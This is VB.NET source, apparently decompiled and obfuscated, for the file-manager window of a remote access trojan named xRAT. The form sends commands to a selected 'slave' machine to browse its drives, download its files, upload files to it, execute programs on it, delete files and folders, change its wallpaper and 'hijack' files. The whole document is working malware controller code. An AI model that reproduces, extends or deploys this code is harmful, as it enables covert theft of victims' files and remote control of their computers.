Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms

Namespace xRAT
    <DesignerGenerated> _
    Public Class File_Manager
        Inherits Form
        ' Methods
        Public Sub New()
            Class1.QaIGh5M7cuigS
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.File_Manager_Load)
            Me.InitializeComponent
        End Sub

        Private Sub ComboBox1_TextChanged(ByVal sender As Object, ByVal e As EventArgs)
            Dim str As String = Me.ComboBox1.Text.Replace(":\", "")
            Class2.Class4_0.method_6.SendToSelected(("DIR|" & str))
            Me.ListView1.Items.Clear
        End Sub

        Private Sub DeleteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If (Me.ListView1.SelectedItems.Count > 0) Then
                If (Me.ListView1.SelectedItems.Item(0).ImageIndex > 0) Then
                    If (Interaction.MsgBox("Are you sure?", (MsgBoxStyle.Question Or MsgBoxStyle.YesNo), "Delete File") = MsgBoxResult.Yes) Then
                        If Me.TextBox1.Text.EndsWith("\") Then
                            Class2.Class4_0.method_6.SendToSelected(("DEL|" & Me.TextBox1.Text & Me.ListView1.SelectedItems.Item(0).Text & "|File"))
                            Dim num As Integer = 1
                            Do
                                Thread.Sleep(10)
                                Application.DoEvents
                                num += 1
                            Loop While (num <= 20)
                            Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text))
                        Else
                            Class2.Class4_0.method_6.SendToSelected(String.Concat(New String() { "DEL|", Me.TextBox1.Text, "\", Me.ListView1.SelectedItems.Item(0).Text, "|File" }))
                            Dim num2 As Integer = 1
                            Do
                                Thread.Sleep(10)
                                Application.DoEvents
                                num2 += 1
                            Loop While (num2 <= 20)
                            Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text))
                        End If
                    End If
                ElseIf (((Me.ListView1.SelectedItems.Item(0).ImageIndex = 0) And (Me.ListView1.SelectedItems.Count > 0)) AndAlso (Interaction.MsgBox("Are you sure?", (MsgBoxStyle.Question Or MsgBoxStyle.YesNo), "Delete Directory") = MsgBoxResult.Yes)) Then
                    If Me.TextBox1.Text.EndsWith("\") Then
                        Class2.Class4_0.method_6.SendToSelected(("DEL|" & Me.TextBox1.Text & Me.ListView1.SelectedItems.Item(0).Text & "|Folder"))
                        Dim num3 As Integer = 1
                        Do
                            Thread.Sleep(10)
                            Application.DoEvents
                            num3 += 1
                        Loop While (num3 <= 20)
                        Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text))
                    Else
                        Class2.Class4_0.method_6.SendToSelected(String.Concat(New String() { "DEL|", Me.TextBox1.Text, "\", Me.ListView1.SelectedItems.Item(0).Text, "|Folder" }))
                        Dim num4 As Integer = 1
                        Do
                            Thread.Sleep(10)
                            Application.DoEvents
                            num4 += 1
                        Loop While (num4 <= 20)
                        Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text))
                    End If
                End If
            End If
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.icontainer_0 Is Nothing)) Then
                    Me.icontainer_0.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub DownloadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.ListView1.SelectedItems.Count > 0) AndAlso (Me.ListView1.SelectedItems.Item(0).ImageIndex > 0)) Then
                Class2.Class4_0.method_6.SendToSelected(("Extraditle|" & Me.TextBox1.Text & "\" & Me.ListView1.SelectedItems.Item(0).Text.ToString))
            End If
        End Sub

        Private Sub ExecuteToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.ListView1.SelectedItems.Count > 0) AndAlso (Me.ListView1.SelectedItems.Item(0).ImageIndex > 0)) Then
                If Me.TextBox1.Text.EndsWith("\") Then
                    Class2.Class4_0.method_6.SendToSelected(("PRCSTART|" & Me.TextBox1.Text & Me.ListView1.SelectedItems.Item(0).Text))
                Else
                    Class2.Class4_0.method_6.SendToSelected(("PRCSTART|" & Me.TextBox1.Text & "\" & Me.ListView1.SelectedItems.Item(0).Text))
                End If
            End If
        End Sub

        Private Sub File_Manager_Load(ByVal sender As Object, ByVal e As EventArgs)
            Me.string_0 = Class2.Class4_0.method_6.lstClients.SelectedItems.Item(0).Text.ToString
            Me.Text = ("File Manager - " & Me.string_0)
            Class2.Class4_0.method_6.SendToSelected("GETDRIVES")
            Me.Label2.Text = Nothing
            Me.TextBox1.Text = "Drive:\"
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.icontainer_0 = New Container
            Dim manager As New ComponentResourceManager(GetType(File_Manager))
            Me.ListView1 = New ListView
            Me.ColumnHeader1 = New ColumnHeader
            Me.ColumnHeader2 = New ColumnHeader
            Me.ContextMenuStrip1 = New ContextMenuStrip(Me.icontainer_0)
            Me.DownloadToolStripMenuItem = New ToolStripMenuItem
            Me.UploadFileToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox2 = New ToolStripTextBox
            Me.ToolStripTextBox3 = New ToolStripTextBox
            Me.UploadToolStripMenuItem = New ToolStripMenuItem
            Me.ExecuteToolStripMenuItem = New ToolStripMenuItem
            Me.SetToolStripMenuItem = New ToolStripMenuItem
            Me.HijackFileToolStripMenuItem = New ToolStripMenuItem
            Me.ToolStripTextBox1 = New ToolStripTextBox
            Me.OkToolStripMenuItem = New ToolStripMenuItem
            Me.DeleteToolStripMenuItem = New ToolStripMenuItem
            Me.ImageList1 = New ImageList(Me.icontainer_0)
            Me.ComboBox1 = New ComboBox
            Me.Label1 = New Label
            Me.TextBox1 = New TextBox
            Me.Label2 = New Label
            Me.ToolTip1 = New ToolTip(Me.icontainer_0)
            Me.PictureBox1 = New PictureBox
            Me.PicRefresh = New PictureBox
            Me.ContextMenuStrip1.SuspendLayout
            DirectCast(Me.PictureBox1, ISupportInitialize).BeginInit
            DirectCast(Me.PicRefresh, ISupportInitialize).BeginInit
            Me.SuspendLayout
            Me.ListView1.Columns.AddRange(New ColumnHeader() { Me.ColumnHeader1, Me.ColumnHeader2 })
            Me.ListView1.ContextMenuStrip = Me.ContextMenuStrip1
            Me.ListView1.FullRowSelect = True
            Me.ListView1.GridLines = True
            Dim point As New Point(12, &H27)
            Me.ListView1.Location = point
            Me.ListView1.MultiSelect = False
            Me.ListView1.Name = "ListView1"
            Dim size As New Size(&H236, 280)
            Me.ListView1.Size = size
            Me.ListView1.SmallImageList = Me.ImageList1
            Me.ListView1.TabIndex = 0
            Me.ListView1.UseCompatibleStateImageBehavior = False
            Me.ListView1.View = View.Details
            Me.ColumnHeader1.Text = "Name"
            Me.ColumnHeader1.Width = &HFF
            Me.ColumnHeader2.Text = "Size"
            Me.ColumnHeader2.Width = &H5F
            Me.ContextMenuStrip1.Items.AddRange(New ToolStripItem() { Me.DownloadToolStripMenuItem, Me.UploadFileToolStripMenuItem, Me.ExecuteToolStripMenuItem, Me.SetToolStripMenuItem, Me.HijackFileToolStripMenuItem, Me.DeleteToolStripMenuItem })
            Me.ContextMenuStrip1.Name = "ContextMenuStrip1"
            size = New Size(200, &H9E)
            Me.ContextMenuStrip1.Size = size
            Me.DownloadToolStripMenuItem.Image = DirectCast(manager.GetObject("DownloadToolStripMenuItem.Image"), Image)
            Me.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.DownloadToolStripMenuItem.Size = size
            Me.DownloadToolStripMenuItem.Text = "Download File"
            Me.UploadFileToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox2, Me.ToolStripTextBox3, Me.UploadToolStripMenuItem })
            Me.UploadFileToolStripMenuItem.Image = Class5.smethod_89
            Me.UploadFileToolStripMenuItem.Name = "UploadFileToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.UploadFileToolStripMenuItem.Size = size
            Me.UploadFileToolStripMenuItem.Text = "Upload File"
            Me.ToolStripTextBox2.Name = "ToolStripTextBox2"
            size = New Size(100, &H15)
            Me.ToolStripTextBox2.Size = size
            Me.ToolStripTextBox2.Text = "C:\myfile.txt"
            Me.ToolStripTextBox3.Name = "ToolStripTextBox3"
            size = New Size(100, &H15)
            Me.ToolStripTextBox3.Size = size
            Me.ToolStripTextBox3.Text = "C:\in_slave_pc.txt"
            Me.UploadToolStripMenuItem.Image = Class5.smethod_7
            Me.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem"
            size = New Size(160, &H16)
            Me.UploadToolStripMenuItem.Size = size
            Me.UploadToolStripMenuItem.Text = ":: Upload ::"
            Me.ExecuteToolStripMenuItem.Image = DirectCast(manager.GetObject("ExecuteToolStripMenuItem.Image"), Image)
            Me.ExecuteToolStripMenuItem.Name = "ExecuteToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.ExecuteToolStripMenuItem.Size = size
            Me.ExecuteToolStripMenuItem.Text = "Execute File"
            Me.SetToolStripMenuItem.Image = DirectCast(manager.GetObject("SetToolStripMenuItem.Image"), Image)
            Me.SetToolStripMenuItem.Name = "SetToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.SetToolStripMenuItem.Size = size
            Me.SetToolStripMenuItem.Text = "Set picture to wallpaper"
            Me.HijackFileToolStripMenuItem.DropDownItems.AddRange(New ToolStripItem() { Me.ToolStripTextBox1, Me.OkToolStripMenuItem })
            Me.HijackFileToolStripMenuItem.Image = DirectCast(manager.GetObject("HijackFileToolStripMenuItem.Image"), Image)
            Me.HijackFileToolStripMenuItem.Name = "HijackFileToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.HijackFileToolStripMenuItem.Size = size
            Me.HijackFileToolStripMenuItem.Text = "Hijack File"
            Me.ToolStripTextBox1.Name = "ToolStripTextBox1"
            size = New Size(100, &H15)
            Me.ToolStripTextBox1.Size = size
            Me.ToolStripTextBox1.Text = "password"
            Me.OkToolStripMenuItem.Image = Class5.smethod_7
            Me.OkToolStripMenuItem.Name = "OkToolStripMenuItem"
            size = New Size(160, &H16)
            Me.OkToolStripMenuItem.Size = size
            Me.OkToolStripMenuItem.Text = ":: Ok ::"
            Me.DeleteToolStripMenuItem.Image = Class5.smethod_6
            Me.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem"
            size = New Size(&HC7, &H16)
            Me.DeleteToolStripMenuItem.Size = size
            Me.DeleteToolStripMenuItem.Text = "Delete File"
            Me.ImageList1.ImageStream = DirectCast(manager.GetObject("ImageList1.ImageStream"), ImageListStreamer)
            Me.ImageList1.TransparentColor = Color.Transparent
            Me.ImageList1.Images.SetKeyName(0, "Actions-document-open-folder-icon.png")
            Me.ImageList1.Images.SetKeyName(1, "Documents-icon.png")
            Me.ImageList1.Images.SetKeyName(2, "Text-Document-icon.png")
            Me.ComboBox1.DropDownStyle = ComboBoxStyle.DropDownList
            Me.ComboBox1.FlatStyle = FlatStyle.Popup
            Me.ComboBox1.FormattingEnabled = True
            point = New Point(&H20F, 9)
            Me.ComboBox1.Location = point
            Me.ComboBox1.MaxDropDownItems = 20
            Me.ComboBox1.Name = "ComboBox1"
            size = New Size(&H33, &H15)
            Me.ComboBox1.Size = size
            Me.ComboBox1.TabIndex = 1
            Me.Label1.AutoSize = True
            point = New Point(&H1E6, 12)
            Me.Label1.Location = point
            Me.Label1.Name = "Label1"
            size = New Size(&H24, 13)
            Me.Label1.Size = size
            Me.Label1.TabIndex = 2
            Me.Label1.Text = "Drive:"
            Me.TextBox1.BorderStyle = BorderStyle.None
            point = New Point(12, 12)
            Me.TextBox1.Location = point
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.ReadOnly = True
            size = New Size(&H1D4, 14)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 3
            Me.TextBox1.Text = "Drive:\"
            Me.Label2.AutoSize = True
            Me.Label2.Font = New Font("Microsoft Sans Serif", 9!, FontStyle.Regular, GraphicsUnit.Point, 0)
            point = New Point(12, &H147)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H12, 15)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 4
            Me.Label2.Text = "%"
            Me.PictureBox1.Cursor = Cursors.Hand
            Me.PictureBox1.Image = Class5.smethod_34
            point = New Point(540, &H147)
            Me.PictureBox1.Location = point
            Me.PictureBox1.Name = "PictureBox1"
            size = New Size(&H10, &H10)
            Me.PictureBox1.Size = size
            Me.PictureBox1.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PictureBox1.TabIndex = 6
            Me.PictureBox1.TabStop = False
            Me.ToolTip1.SetToolTip(Me.PictureBox1, "Open download folder")
            Me.PicRefresh.Cursor = Cursors.Hand
            Me.PicRefresh.Image = Class5.smethod_5
            point = New Point(&H232, &H147)
            Me.PicRefresh.Location = point
            Me.PicRefresh.Name = "PicRefresh"
            size = New Size(&H10, &H10)
            Me.PicRefresh.Size = size
            Me.PicRefresh.SizeMode = PictureBoxSizeMode.AutoSize
            Me.PicRefresh.TabIndex = 5
            Me.PicRefresh.TabStop = False
            Me.ToolTip1.SetToolTip(Me.PicRefresh, "Refresh Directory")
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(590, &H15F)
            Me.ClientSize = size
            Me.Controls.Add(Me.PictureBox1)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.PicRefresh)
            Me.Controls.Add(Me.ComboBox1)
            Me.Controls.Add(Me.Label1)
            Me.Controls.Add(Me.ListView1)
            Me.Controls.Add(Me.Label2)
            Me.FormBorderStyle = FormBorderStyle.Fixed3D
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "File_Manager"
            Me.StartPosition = FormStartPosition.CenterScreen
            Me.Text = "File Manager"
            Me.ContextMenuStrip1.ResumeLayout(False)
            DirectCast(Me.PictureBox1, ISupportInitialize).EndInit
            DirectCast(Me.PicRefresh, ISupportInitialize).EndInit
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.ListView1.SelectedItems.Count > 0) AndAlso (Me.ListView1.SelectedItems.Item(0).ImageIndex = 0)) Then
                If (Me.ListView1.SelectedItems.Item(0).Text = "\") Then
                    Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.ComboBox1.Text))
                ElseIf (Me.ListView1.SelectedItems.Item(0).Text = "..") Then
                    Dim str2 As String = Me.TextBox1.Text.Replace(":\", "")
                    If (str2.Length = 1) Then
                        Class2.Class4_0.method_6.SendToSelected(("DIR|" & str2))
                    Else
                        Dim strArray As String() = Me.TextBox1.Text.Split(New Char() { "\"c })
                        Dim str As String = ""
                        Dim num2 As Integer = (strArray.Length - 2)
                        Dim i As Integer = 0
                        Do While (i <= num2)
                            str = (str & strArray(i) & "\")
                            i += 1
                        Loop
                        str = str.Remove((str.Length - 1))
                        If ((str.Length < 3) And str.Contains(":")) Then
                            str = (str & "\")
                        End If
                        Class2.Class4_0.method_6.SendToSelected(("READDIR|" & str))
                    End If
                ElseIf Me.TextBox1.Text.EndsWith("\") Then
                    Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text & Me.ListView1.SelectedItems.Item(0).Text))
                Else
                    Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text & "\" & Me.ListView1.SelectedItems.Item(0).Text))
                End If
            End If
        End Sub

        Private Sub OkToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub PicRefresh_Click(ByVal sender As Object, ByVal e As EventArgs)
            Class2.Class4_0.method_6.SendToSelected(("READDIR|" & Me.TextBox1.Text))
        End Sub

        Private Sub PictureBox1_Click(ByVal sender As Object, ByVal e As EventArgs)
            If Not Directory.Exists((Application.StartupPath & "\Users")) Then
                Directory.CreateDirectory((Application.StartupPath & "\Users"))
            End If
            If Not Directory.Exists((Application.StartupPath & "\Users\" & Me.string_0)) Then
                Directory.CreateDirectory((Application.StartupPath & "\Users\" & Me.string_0))
            End If
            Dim startInfo As New ProcessStartInfo With { _
                .Arguments = String.Concat(New String() { "/e,/select,", Application.StartupPath, "\Users\", Me.string_0, "" }), _
                .FileName = "explorer.exe" _
            }
            Process.Start(startInfo)
        End Sub

        Private Sub SetToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.ListView1.SelectedItems.Count > 0) AndAlso (Me.ListView1.SelectedItems.Item(0).ImageIndex > 0)) Then
                If Me.TextBox1.Text.EndsWith("\") Then
                    Class2.Class4_0.method_6.SendToSelected(("FILEWALPA|" & Me.TextBox1.Text & Me.ListView1.SelectedItems.Item(0).Text))
                Else
                    Class2.Class4_0.method_6.SendToSelected(("FILEWALPA|" & Me.TextBox1.Text & "\" & Me.ListView1.SelectedItems.Item(0).Text))
                End If
            End If
        End Sub

        Private Sub UploadFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        End Sub

        Private Sub UploadToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            If ((Me.ListView1.SelectedItems.Count > 0) AndAlso (Me.ListView1.SelectedItems.Item(0).ImageIndex > 0)) Then
                Dim inArray As Byte() = File.ReadAllBytes(Me.ToolStripTextBox2.Text)
                Class2.Class4_0.method_6.SendToSelected(("UPFILE|" & Convert.ToBase64String(inArray) & "|" & Me.ToolStripTextBox3.Text))
            End If
        End Sub


        ' Properties
        Friend Overridable Property ColumnHeader1 As ColumnHeader
            Get
                Return Me.columnHeader_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_0 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader2 As ColumnHeader
            Get
                Return Me.columnHeader_1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ColumnHeader)
                Me.columnHeader_1 = value
            End Set
        End Property

        Friend Overridable Property ComboBox1 As ComboBox
            Get
                Return Me._ComboBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ComboBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ComboBox1_TextChanged)
                If (Not Me._ComboBox1 Is Nothing) Then
                    RemoveHandler Me._ComboBox1.TextChanged, handler
                End If
                Me._ComboBox1 = value
                If (Not Me._ComboBox1 Is Nothing) Then
                    AddHandler Me._ComboBox1.TextChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property ContextMenuStrip1 As ContextMenuStrip
            Get
                Return Me._ContextMenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ContextMenuStrip)
                Me._ContextMenuStrip1 = value
            End Set
        End Property

        Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._DeleteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DeleteToolStripMenuItem_Click)
                If (Not Me._DeleteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DeleteToolStripMenuItem.Click, handler
                End If
                Me._DeleteToolStripMenuItem = value
                If (Not Me._DeleteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DeleteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DownloadToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._DownloadToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DownloadToolStripMenuItem_Click)
                If (Not Me._DownloadToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DownloadToolStripMenuItem.Click, handler
                End If
                Me._DownloadToolStripMenuItem = value
                If (Not Me._DownloadToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DownloadToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExecuteToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._ExecuteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExecuteToolStripMenuItem_Click)
                If (Not Me._ExecuteToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExecuteToolStripMenuItem.Click, handler
                End If
                Me._ExecuteToolStripMenuItem = value
                If (Not Me._ExecuteToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExecuteToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property HijackFileToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._HijackFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Me._HijackFileToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ImageList1 As ImageList
            Get
                Return Me.imageList_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ImageList)
                Me.imageList_0 = value
            End Set
        End Property

        Friend Overridable Property Label1 As Label
            Get
                Return Me._Label1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label1 = value
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As Label)
                Me._Label2 = value
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ListView)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListView1_DoubleClick)
                If (Not Me._ListView1 Is Nothing) Then
                    RemoveHandler Me._ListView1.DoubleClick, handler
                End If
                Me._ListView1 = value
                If (Not Me._ListView1 Is Nothing) Then
                    AddHandler Me._ListView1.DoubleClick, handler
                End If
            End Set
        End Property

        Friend Overridable Property OkToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._OkToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.OkToolStripMenuItem_Click)
                If (Not Me._OkToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._OkToolStripMenuItem.Click, handler
                End If
                Me._OkToolStripMenuItem = value
                If (Not Me._OkToolStripMenuItem Is Nothing) Then
                    AddHandler Me._OkToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PicRefresh As PictureBox
            Get
                Return Me._PicRefresh
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PicRefresh_Click)
                If (Not Me._PicRefresh Is Nothing) Then
                    RemoveHandler Me._PicRefresh.Click, handler
                End If
                Me._PicRefresh = value
                If (Not Me._PicRefresh Is Nothing) Then
                    AddHandler Me._PicRefresh.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property PictureBox1 As PictureBox
            Get
                Return Me._PictureBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As PictureBox)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.PictureBox1_Click)
                If (Not Me._PictureBox1 Is Nothing) Then
                    RemoveHandler Me._PictureBox1.Click, handler
                End If
                Me._PictureBox1 = value
                If (Not Me._PictureBox1 Is Nothing) Then
                    AddHandler Me._PictureBox1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property SetToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._SetToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.SetToolStripMenuItem_Click)
                If (Not Me._SetToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._SetToolStripMenuItem.Click, handler
                End If
                Me._SetToolStripMenuItem = value
                If (Not Me._SetToolStripMenuItem Is Nothing) Then
                    AddHandler Me._SetToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As TextBox)
                Me._TextBox1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox1 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox1 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox2 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox2 = value
            End Set
        End Property

        Friend Overridable Property ToolStripTextBox3 As ToolStripTextBox
            Get
                Return Me._ToolStripTextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripTextBox)
                Me._ToolStripTextBox3 = value
            End Set
        End Property

        Friend Overridable Property ToolTip1 As ToolTip
            Get
                Return Me.toolTip_0
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolTip)
                Me.toolTip_0 = value
            End Set
        End Property

        Friend Overridable Property UploadFileToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UploadFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadFileToolStripMenuItem_Click)
                If (Not Me._UploadFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UploadFileToolStripMenuItem.Click, handler
                End If
                Me._UploadFileToolStripMenuItem = value
                If (Not Me._UploadFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UploadFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property UploadToolStripMenuItem As ToolStripMenuItem
            Get
                Return Me._UploadToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized)> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.UploadToolStripMenuItem_Click)
                If (Not Me._UploadToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._UploadToolStripMenuItem.Click, handler
                End If
                Me._UploadToolStripMenuItem = value
                If (Not Me._UploadToolStripMenuItem Is Nothing) Then
                    AddHandler Me._UploadToolStripMenuItem.Click, handler
                End If
            End Set
        End Property


        ' Fields
        <AccessedThroughProperty("ComboBox1")> _
        Private _ComboBox1 As ComboBox
        <AccessedThroughProperty("ContextMenuStrip1")> _
        Private _ContextMenuStrip1 As ContextMenuStrip
        <AccessedThroughProperty("DeleteToolStripMenuItem")> _
        Private _DeleteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("DownloadToolStripMenuItem")> _
        Private _DownloadToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ExecuteToolStripMenuItem")> _
        Private _ExecuteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("HijackFileToolStripMenuItem")> _
        Private _HijackFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Label1")> _
        Private _Label1 As Label
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("ListView1")> _
        Private _ListView1 As ListView
        <AccessedThroughProperty("OkToolStripMenuItem")> _
        Private _OkToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("PicRefresh")> _
        Private _PicRefresh As PictureBox
        <AccessedThroughProperty("PictureBox1")> _
        Private _PictureBox1 As PictureBox
        <AccessedThroughProperty("SetToolStripMenuItem")> _
        Private _SetToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("ToolStripTextBox1")> _
        Private _ToolStripTextBox1 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox2")> _
        Private _ToolStripTextBox2 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox3")> _
        Private _ToolStripTextBox3 As ToolStripTextBox
        <AccessedThroughProperty("UploadFileToolStripMenuItem")> _
        Private _UploadFileToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UploadToolStripMenuItem")> _
        Private _UploadToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ColumnHeader1")> _
        Private columnHeader_0 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader2")> _
        Private columnHeader_1 As ColumnHeader
        Private icontainer_0 As IContainer
        <AccessedThroughProperty("ImageList1")> _
        Private imageList_0 As ImageList
        Private string_0 As String
        <AccessedThroughProperty("ToolTip1")> _
        Private toolTip_0 As ToolTip
    End Class
End Namespace

